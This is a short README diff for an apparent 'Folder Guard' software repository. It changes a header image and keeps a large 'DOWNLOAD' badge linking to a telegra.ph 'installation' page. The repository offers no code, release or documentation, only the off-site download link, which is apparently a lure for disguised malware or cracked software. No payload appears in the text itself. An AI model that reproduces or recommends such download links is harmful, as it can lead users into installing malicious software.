@@ -1,4 +1,4 @@
-![Folder Guard](https://link-to-image.com/folder_guard.png)
+![folder-guard2](https://github.com/user-attachments/assets/0f25bb4f-d2ed-4c98-8bae-0978e1755d58)
 
 # ✅ Link:
 <a href="https://telegra.ph/installation-04-10-18"><img src="https://camo.githubusercontent.com/69a0dca187c20faa11f49053752fbf155cd8cdd1232af268f22a72023ada53d9/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f444f574e4c4f41442d6f72616e67653f7374796c653d666f722d7468652d6261646765" height="80"></a></div>
